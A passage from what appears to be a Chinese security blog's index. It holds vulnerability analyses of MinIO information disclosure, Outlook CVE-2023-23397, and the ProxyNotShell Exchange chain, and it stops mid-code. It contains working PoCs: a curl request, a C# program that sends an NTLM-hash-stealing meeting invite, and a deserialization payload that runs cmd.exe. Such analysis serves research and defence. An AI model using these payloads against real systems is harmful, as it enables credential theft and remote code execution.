综合可得，触发漏洞方法为向/minio/bootstrap/v1/verify接口发送POST请求即可，除了对verify接口做鉴权之外，补丁中还在输出中去除了密钥等敏感信息。 ![[../images/Pasted image 20231007234853.png]]\nPoC\ncurl -X POST http://target/minio/bootstrap/v1/verify 小结 这个漏洞分析起来较为简单，由于Minio是go开发的，直接RCE比较难，目前RCE方式是通过信息泄露获取到管理员密钥登录，而后替换更新链接，在使用minio自带的mc工具进行更新，将当前minio实例替换为带有后门版本的minio，从而执行任意代码。\n参考链接\nhttps://github.com/minio/minio/compare/RELEASE.2023-03-13T19-46-17Z\u0026hellip;RELEASE.2023-03-20T20-16-18Z\n创建于2023-10-06\nCreated at 2023-05-05T20:53:41+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-23397-outlook-eop/","title":"CVE-2023-23397 Outlook 权限提升漏洞分析","tags":["漏洞分析"],"description":"","content":"基本信息 Microsoft Outlook 存在权限提升漏洞，未经身份验证的远程攻击者可通过向受害者发送特制的带有UNC地址的电子邮件来利用此漏洞，当受害者所用的outlook处于打开状态时，outlook收到的会议提醒过期时会尝试连接攻击者指定的外部 UNC 位置。这会将受害者的Net-NTLMv2 hash泄露给攻击者，然后攻击者可以将其中继到另一个服务，进而获得该用户权限。\n在微软发布的补丁中对该漏洞修复不完全，只限制了所用UNC路径中不能含有”.”，攻击者可以使用诸如\\aaa\\形式的UNC路径对其绕过。\n给Exchange邮箱发送带有ReminderFileParameter属性并指向UNC路径，ReminderOverride设为true，ReminderSet设为true即可触发\n影响版本 略\n环境搭建 outlook 2016 windows 2019 + AD域 技术分析\u0026amp;调试 根据微软文档，Outlook会议可以设置PidLidReminderFileParameter和PidLidReminderOverride属性，其含义分别为：指定客户在该对象的提醒过期时应播放的声音的文件名和Outlook客户端是否应该保留PidLidReminderFileParameter属性的值。攻击者在发送给受害者的会议里面设置PidLidReminderFileParameter和PidLidReminderOverride属性，当会议过期时outlook会尝试解析PidLidReminderFileParameter属性并尝试播放PidLidReminderFileParameter指向的路径的声音文件(.wav)，但outlook解析时并未限制PidLidReminderFileParameter属性指向的是本地文件还是网络文件。\n即PidLidReminderFileParameter可以指向网络共享文件。攻击者将恶意会议邀请的PidLidReminderFileParameter属性设为攻击者控制的系统对应的UNC路径，并将PidLidReminderOverride属性设为true，将邀请发给受害者邮箱，当受害者在outlook上登录了邮箱时，outlook会自动获取该文件，当该路径参数为UNC路径时，outlook会以该用户身份向这个UNC路径对应的系统发起NTLM认证，尝试获取UNC路径指向的文件，此时攻击者可以获取到该认证hash，并将该hash中继到其他服务上，即可获取到受害者的权限。\n该漏洞PoC先使用MsgKit库生成msg文件（outlook邮件格式），而后利用Aspose库读取msg文件并将其反序列化为MapiMessage对象，在其上添加ReminderSet并置为true，而后转换为MailMessage对象，通过smtpClient.Send发给受害者。从而触发漏洞，获取到受害者NTLM hash。 在微软2023年3月补丁日中对此漏洞进行了修复，但此漏洞修复不完全，只是限制了PidLidReminderFileParameter属性内不能含有”.”，导致攻击者可以使用\\aaa\\形式绕过此补丁。\nPoC\nusing System; using Aspose.Email.Mapi; using Aspose.Email; using Aspose.Email.Clients.Smtp; namespace MsgKit { class Program { static void Main(string[] args) { string lanPath = @\u0026#34;\\\\server\\test\\\u0026#34;; string saveFilePath = @\u0026#34;saveFilePath\u0026#34;; using (var appoionment = new Appointment( new Sender(\u0026#34;winserver@domain.com\u0026#34;, \u0026#34;Sender\u0026#34;), new Representing(\u0026#34;winserver@domain.com\u0026#34;, \u0026#34;Sender\u0026#34;), \u0026#34;pish\u0026#34;)) { appoionment.Recipients.AddTo(\u0026#34;administrator@domain.com\u0026#34;, \u0026#34;administrator\u0026#34;); appoionment.Subject = \u0026#34;pish\u0026#34;; appoionment.Location = \u0026#34;Virtual\u0026#34;; appoionment.MeetingStart = DateTime.Now.Date; appoionment.MeetingEnd = DateTime.Now.Date.AddHours(2).Date; appoionment.AllDay = true; appoionment.BodyText = \u0026#34;hello, world\u0026#34;; appoionment.BodyHtml = \u0026#34;\u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;/head\u0026gt;\u0026lt;body\u0026gt;\u0026lt;b\u0026gt;hello, pls read it.\u0026lt;/b\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#34;; appoionment.SentOn = DateTime.UtcNow; appoionment.Importance = MsgKit.Enums.MessageImportance.IMPORTANCE_NORMAL; appoionment.IconIndex = MsgKit.Enums.MessageIconIndex.UnsentMail; appoionment.PidLidReminderFileParameter = lanPath; appoionment.PidLidReminderOverride = false; appoionment.Save(saveFilePath); } var msg = MapiMessage.Load(saveFilePath); msg.SetProperty(KnownPropertyList.ReminderSet, true); msg.SetProperty(KnownPropertyList.ReminderFileParameter, lanPath + \u0026#34;\\a\u0026#34;); msg.SetProperty(KnownPropertyList.ReminderOverride, true); SmtpClient smtpClient = new SmtpClient(); smtpClient.Host = \u0026#34;Host\u0026#34;; smtpClient.Username = \u0026#34;username\u0026#34;; smtpClient.Password = \u0026#34;Password\u0026#34;; smtpClient.Port = 587; smtpClient.SecurityOptions = Aspose.Email.Clients.SecurityOptions.SSLExplicit; try { var options = new MailConversionOptions(); options.KeepOriginalEmailAddresses = true; options.ConvertAsTnef = true; options.PreserveEmbeddedMessageFormat = true; options.PreserveRtfContent = true; smtpClient.Send(msg.ToMailMessage(options)); Console.WriteLine(\u0026#34;success send\u0026#34;); } catch (Exception ex) { Console.WriteLine(\u0026#34;error:\u0026#34; + ex.ToString()); } } } } 小结 该漏洞是典型的逻辑漏洞，由于微软没有限制邮件的过期声音文件路径属性，导致可以设置这个属性为UNC路径来让outlook发起NTLM请求，尝试从网络加载文件，从而偷取NTLM hash。\n第一次尝试使用outlook构造PoC时失败了，最后找到了C#的邮件库Aspose，通过修改Aspose库并利用该库就可以设置PidLidReminderFileParameter属性了。\n参考链接\nhttps://www.mdsec.co.uk/2023/03/exploiting-cve-2023-23397-microsoft-outlook-elevation-of-privilege-vulnerability/\nhttps://github.com/Sicos1977/MsgKit\nhttps://research.checkpoint.com/2023/the-obvious-the-normal-and-the-advanced-a-comprehensive-analysis-of-outlook-attack-vectors/\nCreated at 2023-05-05T20:50:19+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/proxy-not-shell/","title":"Proxy Not Shell 利用链分析","tags":["漏洞分析"],"description":"","content":"漏洞环境 Windows Server 2019 Windows Exchange 2019 CU9 漏洞分析 漏洞链包含了两个漏洞：\nCVE-2022-41040 Exchange 权限提升漏洞 CVE-2022-41082 Exchange 远程代码执行漏洞 CVE-2022-41040 是ProxyShell修复不完全的产物，在ProxyShell利用链中无需身份验证就可以通过autodiscover.json请求到/PowerShell接口，在CVE-2022-41040 中，仅需要低权限身份验证就可以请求到该接口，通过SSRF将低权限转换为高权限。\nCVE-2022-41082是Exchange的反序列化漏洞，通过传入恶意序列化数据，使得Exchange触发能够造成代码执行的反序列化过程，将指定数据反序列化到恶意类，从而在Exchange服务器上执行任意代码。\n在PoC中发送了以下三种类型的PSRP消息\n0x00010002 SESSION_CAPABILITY\nSESSION_CAPABILITY 应该是创建RunspacePool\n0x00010004 INIT_RUNSPACEPOOL\nINIT_RUNSPACEPOOL 应该是初始化RunspacePool\n0x00021006 CREATE_PIPELINE\n创建命令管道并在指定的 RunspacePool 中调用它\nPoC通过PSRP协议创建了远程PowerShell管道，并试图在这个管道内执行New-OfflineAddressBook这个cmdlet，并将对应的序列化数据传给了Exchange。\nPoC主要组成部分如下所示，BA标签内是base64编码的序列化System.UnitySerializationHolder对象\n\u0026lt;Obj N=\u0026#34;V\u0026#34; RefId=\u0026#34;14\u0026#34;\u0026gt; \u0026lt;TN RefId=\u0026#34;2\u0026#34;\u0026gt; \u0026lt;T\u0026gt;System.ServiceProcess.ServiceController\u0026lt;/T\u0026gt; \u0026lt;T\u0026gt;System.Object\u0026lt;/T\u0026gt; \u0026lt;/TN\u0026gt; \u0026lt;ToString\u0026gt;System.ServiceProcess.ServiceController\u0026lt;/ToString\u0026gt; \u0026lt;Props\u0026gt; \u0026lt;S N=\u0026#34;Name\u0026#34;\u0026gt;Type\u0026lt;/S\u0026gt; \u0026lt;Obj N=\u0026#34;TargetTypeForDeserialization\u0026#34;\u0026gt; \u0026lt;TN RefId=\u0026#34;2\u0026#34;\u0026gt; \u0026lt;T\u0026gt;System.Exception\u0026lt;/T\u0026gt; \u0026lt;T\u0026gt;System.Object\u0026lt;/T\u0026gt; \u0026lt;/TN\u0026gt; \u0026lt;MS\u0026gt; \u0026lt;BA N=\u0026#34;SerializationData\u0026#34;\u0026gt;AAEAAAD/////AQAAAAAAAAAEAQAAAB9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAREYXRhCVVuaXR5VHlwZQxBc3NlbWJseU5hbWUBAAEIBgIAAAAgU3lzdGVtLldpbmRvd3MuTWFya3VwLlhhbWxSZWFkZXIEAAAABgMAAABYUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQs=\u0026lt;/BA\u0026gt; \u0026lt;/MS\u0026gt; \u0026lt;/Obj\u0026gt; \u0026lt;/Props\u0026gt; \u0026lt;S\u0026gt; \u0026lt;![CDATA[\u0026lt;ResourceDictionary xmlns=\u0026#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation\u0026#34; xmlns:x=\u0026#34;http://schemas.microsoft.com/winfx/2006/xaml\u0026#34; xmlns:System=\u0026#34;clr-namespace:System;assembly=mscorlib\u0026#34; xmlns:Diag=\u0026#34;clr-namespace:System.Diagnostics;assembly=system\u0026#34;\u0026gt;\u0026lt;ObjectDataProvider x:Key=\u0026#34;LaunchCalch\u0026#34; ObjectType=\u0026#34;{x:Type Diag:Process}\u0026#34; MethodName=\u0026#34;Start\u0026#34;\u0026gt;\u0026lt;ObjectDataProvider.MethodParameters\u0026gt;\u0026lt;System:String\u0026gt;cmd.exe\u0026lt;/System:String\u0026gt;\u0026lt;System:String\u0026gt;/c whoami\u0026gt; c:\\users\\public\\1.txt\u0026lt;/System:String\u0026gt; \u0026lt;/ObjectDataProvider.MethodParameters\u0026gt; \u0026lt;/ObjectDataProvider\u0026gt; \u0026lt;/ResourceDictionary\u0026gt;]]\u0026gt; \u0026lt;/S\u0026gt; \u0026lt;/Obj\u0026gt; XamlReader.Parse() BA标签数据 .....ÿÿÿÿ..............System.UnitySerializationHolder..... Data\tUnityType.AssemblyName......... System.Windows.Markup.XamlReader......... XPresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35. PoC部分由两个对象嵌套而成，大致结构如下所示：\nObj V(System.ServiceProcess.ServiceController): String Name=\u0026#34;Type\u0026#34; Obj TargetTypeForDeserialization(System.Exception): ByteArray SerializationData String SerializationData 代码逻辑\n代码逻辑如下图\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?\u003e\r\u003c!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"\u003e\r背景 1\rCenter Gradient\r页-1\r流程\rReadOneObject\rReadOneObject\t流程.8\rReadOneDeserializedObject 遍历XML树的标签\rReadOneDeserializedObject遍历XML树的标签\t动态连接线\r调用读取一个反序列化对象 object obj = this.ReadOneDeserializedObject\r调用，读取一个反序列化对象object obj = this.ReadOneDeserializedObject\t动态连接线.12\r碰到Obj标签调用读取一个Obj对象 if (this.IsNextElement(\u0026#34;Obj\u0026#34;)){ return thi...\r碰到Obj标签，调用，读取一个Obj对象if (this.IsNextElement(\u0026#34;Obj\u0026#34;)){return this.ReadPSObject();}\t流程.11\rReadPSObject 读取一个Obj对象\rReadPSObject读取一个Obj对象\t动态连接线.14\r碰到Props标签调用读取Props标签 if (this.IsNextElement(\u0026#34;Props\u0026#34;)){ this.R...\r碰到Props标签，调用，读取Props标签if (this.IsNextElement(\u0026#34;Props\u0026#34;)){this.ReadProperties(psobject);}\t流程.13\rReadProperties\rReadProperties\t动态连接线.16\r调用读取嵌套对象\r调用，读取嵌套对象\t流程.15\rReadOneObject\rReadOneObject\t动态连接线.20\r调用将反序列化数据 转换为目标类型此时目标类型为System.Exception\r调用，将反序列化数据转换为目标类型，此时目标类型为System.Exception\t流程.19\rConvertTo\rConvertTo\t动态连接线.22\r一系列调用\r一系列调用\t流程.21\rObject.Reader.Deserialize\rObject.Reader.Deserialize\t动态连接线.24\r调用解析内存中的序列化数据\r调用，解析内存中的序列化数据\t流程.23\r__BinaryParser.Run\r__BinaryParser.Run\t动态连接线.28\r流程.27\r将序列化数据解析为System.UnitySerializationHolder对象并载入m_assmblyName对应的...\r将序列化数据解析为System.UnitySerializationHolder对象，并载入m_assmblyName对应的DLL\t动态连接线.39\r流程.38\r转化为在m_assmblyName对应的DLL中的m_data对应类型的Type对象\r转化为在m_assmblyName对应的DLL中的m_data对应类型的Type对象\t动态连接线.41\r一系列返回\r一系列返回\t动态连接线.43\r流程.42\r将ConverTo返回的Type对象加入.adaptedMembers\r将ConverTo返回的Type对象加入.adaptedMembers\t流程.45\rGetTargetTypeForDeserialization\rGetTargetTypeForDeserialization\t流程.53\rReadOneDeserializedObject\rReadOneDeserializedObject\t流程.54\rReadOneObject\rReadOneObject\t动态连接线.56\r动态连接线.57\r动态连接线.58\r动态连接线.59\r调用\r调用\t动态连接线.61\r流程.60\rGetPSStandardMember\rGetPSStandardMember\t动态连接线.63\r流程.62\r读取adaptedMembers的TargetTypeForDeserialization并返回\r读取adaptedMembers的TargetTypeForDeserialization并返回\t动态连接线.66\r调用将外层对象序列化数据\r调用，将外层对象序列化数据\t流程.65\rLanguagePrimitives.ConvertTo\rLanguagePrimitives.ConvertTo\t动态连接线.69\r流程.68\r将S标签内数据转换为XamlReader对象触发代码执行\r将S标签内数据转换为XamlReader对象，触发代码执行\t在Exchange中，允许反序列化的类白名单和类反序列化相关信息定义在exchange.partial.types.ps1xml和exchange.types.ps1xml等文件中，Exchange会读取这些文件，在反序列化数据时，会payload里面的目标类和文件里面的白名单类做对比，只有在白名单内的类才允许反序列化。\nPoC由嵌套对象组成，在反序列化嵌套对象时，会先反序列化里层对象，而后反序列化外层对象。在Exchang反序列化PoC的里层对象时，将通过ConvertTo函数转换到目标类，传给ConvertTo的resultType值为System.Exception，System.Exception在exchange.partial.types.ps1xml中定义如下：\n\u0026lt;Type\u0026gt; \u0026lt;Name\u0026gt;System.Exception\u0026lt;/Name\u0026gt; \u0026lt;Members\u0026gt; \u0026lt;CodeProperty IsHidden=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;Name\u0026gt;SerializationData\u0026lt;/Name\u0026gt; \u0026lt;GetCodeReference\u0026gt; \u0026lt;TypeName\u0026gt;Microsoft.Exchange.Data.SerializationTypeConverter\u0026lt;/TypeName\u0026gt; \u0026lt;MethodName\u0026gt;GetSerializationData\u0026lt;/MethodName\u0026gt; \u0026lt;/GetCodeReference\u0026gt; \u0026lt;/CodeProperty\u0026gt; \u0026lt;/Members\u0026gt; \u0026lt;TypeConverter\u0026gt; \u0026lt;TypeName\u0026gt;Microsoft.Exchange.Data.SerializationTypeConverter\u0026lt;/TypeName\u0026gt; \u0026lt;/TypeConverter\u0026gt; \u0026lt;/Type\u0026gt; internal static object ConvertTo(object valueToConvert, Type resultType, bool recursion, IFormatProvider formatProvider, TypeTable backupTypeTable) { object result; using (LanguagePrimitives.typeConversion.TraceScope(\u0026#34;Converting \\\u0026#34;{0}\\\u0026#34; to \\\u0026#34;{1}\\\u0026#34;.\u0026#34;, valueToConvert, resultType)) { if (resultType == null) { throw PSTraceSource.NewArgumentNullException(\u0026#34;resultType\u0026#34;); } bool flag; result = LanguagePrimitives.FigureConversion(valueToConvert, resultType, out flag).Invoke(flag ? PSObject.Base(valueToConvert) : valueToConvert, resultType, recursion, flag ? ((PSObject)valueToConvert) : null, formatProvider, backupTypeTable); } return result; } 其定义了*\u0026lt;TypeName\u0026gt;Microsoft.Exchange.Data.SerializationTypeConverter\u0026lt;/TypeName\u0026gt;，Exchange将通过Microsoft.Exchange.Data.SerializationTypeConverter*类对里层序列化数据进行反序列化。Microsoft.Exchange.Data.SerializationTypeConverter经过一系列调用，最终由System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserialize方法进行反序列化。\n在该方法会调用System.Runtime.Serialization.Formatters.Binary.__BinaryParser.Run，这方法会循环读取内存中的里层对象的序列化数据，将其转换为System.UnitySerializationHolder对象。\n之后Exchange会通过Assembly.LoadFrom载入*System.UnitySerializationHolder.m_assemblyName所指明的DLL，并且返回System.UnitySerializationHolder.m_data*类型的Type对象。\ninternal object Deserialize(HeaderHandler handler, __BinaryParser serParser, bool fCheck, bool isCrossAppDomain, IMethodCallMessage methodCallMessage) { ...... serParser.Run(); ...... if (!this.bMethodCall \u0026amp;\u0026amp; !this.bMethodReturn) { if (this.TopObject == null) { throw new SerializationException(Environment.GetResourceString(\u0026#34;Serialization_TopObject\u0026#34;)); } if (this.HasSurrogate(this.TopObject.GetType()) \u0026amp;\u0026amp; this.topId != 0L) { this.TopObject = this.m_objectManager.GetObject(this.topId); } if (this.TopObject is IObjectReference) { this.TopObject = ((IObjectReference)this.TopObject).GetRealObject(this.m_context); } } if (this.bFullDeserialization) { this.m_objectManager.RaiseDeserializationEvent(); } if (handler != null) { this.handlerObject = handler(this.headers); } if (this.bMethodCall) { object[] callA = this.TopObject as object[]; this.TopObject = this.binaryMethodCall.ReadArray(callA, this.handlerObject); } else if (this.bMethodReturn) { object[] returnA = this.TopObject as object[]; this.TopObject = this.binaryMethodReturn.ReadArray(returnA, methodCallMessage, this.handlerObject); } return this.TopObject; } 在一系列函数调用返回后，System.Management.Automation.InternalDeserializer.ReadProperties会将System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserialize返回的对象添加到PSObject.adaptedMembers中，需要注意的是该对象变量名为TargetTypeForDeserialization。\nprivate void ReadProperties(PSObject dso) { dso.isDeserialized = true; dso.adaptedMembers = new PSMemberInfoInternalCollection\u0026lt;PSPropertyInfo\u0026gt;(); dso.InstanceMembers.Add(PSObject.dotNetInstanceAdapter.GetDotNetMethod\u0026lt;PSMemberInfo\u0026gt;(dso, \u0026#34;GetType\u0026#34;)); PSGetMemberBinder.SetHasInstanceMember(\u0026#34;GetType\u0026#34;); dso.clrMembers = new PSMemberInfoInternalCollection\u0026lt;PSPropertyInfo\u0026gt;(); if (this.ReadStartElementAndHandleEmpty(\u0026#34;Props\u0026#34;)) { while (this._reader.NodeType == XmlNodeType.Element) { string name = this.ReadNameAttribute(); object serializedValue = this.ReadOneObject(); PSProperty member = new PSProperty(name, serializedValue); dso.adaptedMembers.Add(member); } this.ReadEndElement(); } } 在反序列化外层对象时，ReadOneObject会调用GetTargetTypeForDeserialization获取反序列化的目标类型，并通过ConvertTo转化为该对象。\n在GetTargetTypeForDeserialization函数中，将会调用GetPSStandardMember并传入硬编码的TargetTypeForDeserialization，在GetPSStandardMember中会通过TypeTableGetMemberDelegate创建成员集合，其中包括子类的成员属性，而后匹配其中的memberName项对应的值并返回。此时获取的值为XamlReader类型的Type对象。\ninternal Type GetTargetTypeForDeserialization(TypeTable backupTypeTable) { PSMemberInfo psstandardMember = this.GetPSStandardMember(backupTypeTable, \u0026#34;TargetTypeForDeserialization\u0026#34;); if (psstandardMember != null) { return psstandardMember.Value as Type; } return null; } internal PSMemberInfo GetPSStandardMember(TypeTable backupTypeTable, string memberName) { PSMemberInfo psmemberInfo = null; TypeTable typeTable = (backupTypeTable != null) ? backupTypeTable : this.GetTypeTable(); if (typeTable != null) { PSMemberSet psmemberSet = PSObject.TypeTableGetMemberDelegate\u0026lt;PSMemberSet\u0026gt;(this, typeTable, \u0026#34;PSStandardMembers\u0026#34;); if (psmemberSet != null) { psmemberSet.ReplicateInstance(this); psmemberInfo = new PSMemberInfoIntegratingCollection\u0026lt;PSMemberInfo\u0026gt;(psmemberSet, PSObject.GetMemberCollection(PSMemberViewTypes.All, backupTypeTable))[memberName]; } } if (psmemberInfo == null) { psmemberInfo = (this.InstanceMembers[\u0026#34;PSStandardMembers\u0026#34;] as PSMemberSet); } return psmemberInfo; } 外层类类型定义为System.ServiceProcess.ServiceController，其定义在types.ps1xml文件内，定义如下。\n\u0026lt;Type\u0026gt; \u0026lt;Name\u0026gt;System.ServiceProcess.ServiceController\u0026lt;/Name\u0026gt; \u0026lt;Members\u0026gt; \u0026lt;MemberSet\u0026gt; \u0026lt;Name\u0026gt;PSStandardMembers\u0026lt;/Name\u0026gt; \u0026lt;Members\u0026gt; \u0026lt;PropertySet\u0026gt; \u0026lt;Name\u0026gt;DefaultDisplayPropertySet\u0026lt;/Name\u0026gt; \u0026lt;ReferencedProperties\u0026gt; \u0026lt;Name\u0026gt;Status\u0026lt;/Name\u0026gt; \u0026lt;Name\u0026gt;Name\u0026lt;/Name\u0026gt; \u0026lt;Name\u0026gt;DisplayName\u0026lt;/Name\u0026gt; \u0026lt;/ReferencedProperties\u0026gt; \u0026lt;/PropertySet\u0026gt; \u0026lt;/Members\u0026gt; \u0026lt;/MemberSet\u0026gt; \u0026lt;AliasProperty\u0026gt; \u0026lt;Name\u0026gt;Name\u0026lt;/Name\u0026gt; \u0026lt;ReferencedMemberName\u0026gt;ServiceName\u0026lt;/ReferencedMemberName\u0026gt; \u0026lt;/AliasProperty\u0026gt; \u0026lt;AliasProperty\u0026gt; \u0026lt;Name\u0026gt;RequiredServices\u0026lt;/Name\u0026gt; \u0026lt;ReferencedMemberName\u0026gt;ServicesDependedOn\u0026lt;/ReferencedMemberName\u0026gt; \u0026lt;/AliasProperty\u0026gt; \u0026lt;ScriptMethod\u0026gt; \u0026lt;Name\u0026gt;ToString\u0026lt;/Name\u0026gt; \u0026lt;Script\u0026gt; $this.ServiceName \u0026lt;/Script\u0026gt; \u0026lt;/ScriptMethod\u0026gt; \u0026lt;/Members\u0026gt; \u0026lt;/Type\u0026gt; 在GetPSStandardMember函数会试图获取System.ServiceProcess.ServiceController类的TargetTypeForDeserialization（传入的硬编码参数）属性，但其在文件内没有定义默认的TargetTypeForDeserialization值，所以外层类的members内没有TargetTypeForDeserialization名字的值，Exchange将试图从子类的members属性中检索TargetTypeForDeserialization名字的值，前面说过在对内层对象反序列化时，通过ReadProperties将名为TargetTypeForDeserialization的XamlReader类型的Type对象添加到了adaptedMembers中，此时Exchange将会检索到该对象并返回。\n获取到targetTypeForDeserialization之后，ReadOneObject调用LanguagePrimitives.ConvertTo将序列化数据转换为targetTypeForDeserialization(XamlReader)。\ninternal object ReadOneObject(out string streamName) { .... object obj = this.ReadOneDeserializedObject(out streamName, out flag); ..... Type targetTypeForDeserialization = psobject.GetTargetTypeForDeserialization(this._typeTable); .... object obj2 = LanguagePrimitives.ConvertTo(obj, targetTypeForDeserialization, true, CultureInfo.InvariantCulture, this._typeTable); ..... } ConvertTo函数会进行如下调用链，通过反射获取到XamlReader类的Parse方法后，将其调用，成功执行代码。\n调试 使用dnsPy附加到下面的进程\nc:\\windows\\system32\\inetsrv\\w3wp.exe -ap \u0026#34;MSExchangePowerShellAppPool\u0026#34; -v \u0026#34;v4.0\u0026#34; -c \u0026#34;C:\\Program Files\\Microsoft\\Exchange Server\\V15\\bin\\GenericAppPoolConfigWithGCServerEnabledFalse.config\u0026#34; -a \\\\.\\pipe\\iisipm319caf0c-5de0-4833-8a04-4b28f4a836ae -h \u0026#34;C:\\inetpub\\temp\\apppools\\MSExchangePowerShellAppPool\\MSExchangePowerShellAppPool.config\u0026#34; -w \u0026#34;\u0026#34; -m 0 在以下几个地方下断点\nSystem.Runtime.Serialization.Formatters.Binary ObjectReader.Deserialize 发送PoC，调试器在断点处断下，此时调用栈如下:\n此时为Exchange试图将Props标签内的序列化数据通过ConvertTo函数转化为System.Exception对象，System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserialize会通过serParser.Run()解析读入内存中的base64解码数据。\ninternal object Deserialize(HeaderHandler handler, __BinaryParser serParser, bool fCheck, bool isCrossAppDomain, IMethodCallMessage methodCallMessage) { ..... serParser.Run(); if (this.bFullDeserialization) { this.m_objectManager.DoFixups(); } if (!this.bMethodCall \u0026amp;\u0026amp; !this.bMethodReturn) { if (this.TopObject == null) { throw new SerializationException(Environment.GetResourceString(\u0026#34;Serialization_TopObject\u0026#34;)); } if (this.HasSurrogate(this.TopObject.GetType()) \u0026amp;\u0026amp; this.topId != 0L) { this.TopObject = this.m_objectManager.GetObject(this.topId); } if (this.TopObject is IObjectReference) { this.TopObject = ((IObjectReference)this.TopObject).GetRealObject(this.m_context); } } if (this.bFullDeserialization) { this.m_objectManager.RaiseDeserializationEvent(); } if (handler != null) { this.handlerObject = handler(this.headers); } if (this.bMethodCall) { object[] callA = this.TopObject as object[]; this.TopObject = this.binaryMethodCall.ReadArray(callA, this.handlerObject); } else if (this.bMethodReturn) { object[] returnA = this.TopObject as object[]; this.TopObject = this.binaryMethodReturn.ReadArray(returnA, methodCallMessage, this.handlerObject); } return this.TopObject; } serParser.Run()会将内存序列化数据试图转化为System.UnitySerializationHolder 对象，代码如下，通过循环读取各个标志位调用不同方法从内存中读取指定类型的数据。构造出System.UnitySerializationHolder对象并载入System.UnitySerializationHolder.AssemblyName对应的DLL。\ninternal void Run() { try { bool flag = true; this.ReadBegin(); this.ReadSerializationHeaderRecord(); while (flag) { BinaryHeaderEnum binaryHeaderEnum = BinaryHeaderEnum.Object; BinaryTypeEnum binaryTypeEnum = this.expectedType; if (binaryTypeEnum != BinaryTypeEnum.Primitive) { if (binaryTypeEnum - BinaryTypeEnum.String \u0026gt; 6) { throw new SerializationException(Environment.GetResourceString(\u0026#34;Serialization_TypeExpected\u0026#34;)); } byte b = this.dataReader.ReadByte(); binaryHeaderEnum = (BinaryHeaderEnum)b; switch (binaryHeaderEnum) { case BinaryHeaderEnum.Object: this.ReadObject(); break; case BinaryHeaderEnum.ObjectWithMap: ..... this.ReadObjectWithMap(binaryHeaderEnum); break; case BinaryHeaderEnum.ObjectWithMapTyped: ...... this.ReadObjectWithMapTyped(binaryHeaderEnum); break; case BinaryHeaderEnum.ObjectString: ...... this.ReadObjectString(binaryHeaderEnum); break; case BinaryHea......flag2) { ObjectProgress objectProgress = (ObjectProgress)this.stack.Peek(); if (objectProgress == null) { this.expectedType = BinaryTypeEnum.ObjectUrt; this.expectedTypeInformation = null; flag2 = true; } else { flag2 = objectProgress.GetNext(out objectProgress.expectedType, out objectProgress.expectedTypeInformation); this.expectedType = objectProgress.expectedType; this.expectedTypeInformation = objectProgress.expectedTypeInformation; if (!flag2) { this.prs.Init(); if (objectProgress.memberValueEnum == InternalMemberValueE.Nested) { this.prs.PRparseTypeEnum = InternalParseTypeE.MemberEnd; this.prs.PRmemberTypeEnum = objectProgress.memberTypeEnum; this.prs.PRmemberValueEnum = objectProgress.memberValueEnum; this.objectReader.Parse(this.prs); } else { this.prs.PRparseTypeEnum = InternalParseTypeE.ObjectEnd; this.prs.PRmemberTypeEnum = objectProgress.memberTypeEnum; this.prs.PRmemberValueEnum = objectProgress.memberValueEnum; this.objectReader.Parse(this.prs); } this.stack.Pop(); this.PutOp(objectProgress); } } } } } } ...... } 将XamlReader读入内存\n在System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserialize中将通过\nthis.TopObject = ((IObjectReference)this.TopObject).GetRealObject(this.m_context); 将System.UnitySerializationHolder转化为Type类型的XamlReader对象，并通过反射获取了XamlReader类的各个属性。\n在最后将this.TopObject作为返回值返回，在经过一系列函数调用返回后，可以在调试器看到ConvertTo函数返回了Object类型对象obj2，可以看到其为类型为Type类型的XamlReader对象，之后ReadOneObject返回该对象。\n注：Type类型是Exchange内定义的抽象类，如下所示：\nnamespace System { // Token: 0x02000148 RID: 328 [ClassInterface(ClassInterfaceType.None)] [ComDefaultInterface(typeof(_Type))] [ComVisible(true)] [__DynamicallyInvokable] [Serializable] public abstract class Type : MemberInfo, _Type, IReflect { // Token: 0x17000217 RID: 535 // (get) Token: 0x060013E6 RID: 5094 RVA: 0x0003BE2A File Offset: 0x0003A02A public override MemberTypes MemberType { get { return MemberTypes.TypeInfo; } } (应该可以理解obj2为实现了Type这个抽象类的XamlReader对象，而XamlReader继承了Object这个父类，所以可以使用Object类型对象接受)\n在调用栈内，ReadOneObject由ReadProperties调用，回到ReadProperties逻辑中，Exchange会将ReadOneObject返回的的Type类型的XamlReader对象添加到dso.adaptedMembers中，而后这个dso将会返回到调用栈内的ReadOneObject函数。\n继续调试，此时嵌套对象的内层对象已反序列化，开始反序列化外层对象，回到程序中，从下图可以看到，将会调用psobject.GetTargetTypeForDeserialization获取目标反序列化类型，此时psobject内的adaptedMembers内有名为TargetTypeForDeserialization的对象，其类型为Type的XamlReader对象\n进入到psobject.GetTargetTypeForDeserialization内，调用this.GetPSStandardMember试图获取PSMemberInfo 对象，而后将其强转为Type对象返回，若失败则返回null\ninternal Type GetTargetTypeForDeserialization(TypeTable backupTypeTable) { PSMemberInfo psstandardMember = this.GetPSStandardMember(backupTypeTable, \u0026#34;TargetTypeForDeserialization\u0026#34;); if (psstandardMember != null) { return psstandardMember.Value as Type; } return null; } 在GetPSStandardMember函数内，调用PSObject.TypeTableGetMemberDelegate并传入当前对象、允许的类型列表和硬编码PSStandardMembers以初始化PSMemberSet 对象。\ninternal PSMemberInfo GetPSStandardMember(TypeTable backupTypeTable, string memberName) { PSMemberInfo psmemberInfo = null; TypeTable typeTable = (backupTypeTable != null) ? backupTypeTable : this.GetTypeTable(); if (typeTable != null) { PSMemberSet 